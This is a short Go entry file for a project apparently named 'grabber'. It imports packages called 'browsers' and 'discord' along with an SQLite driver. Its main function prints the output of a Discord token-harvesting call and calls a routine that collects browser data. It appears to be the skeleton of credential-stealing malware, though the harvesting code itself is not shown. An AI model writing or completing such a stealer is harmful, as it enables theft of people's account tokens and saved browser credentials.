// main.go
package main

import (
	"fmt"

	"example.com/grabber/browsers"
	"example.com/grabber/discord"
	_ "github.com/mattn/go-sqlite3"
)

func main() {
	fmt.Println(discord.GetTokens())
	browsers.GetBrowserData()
}
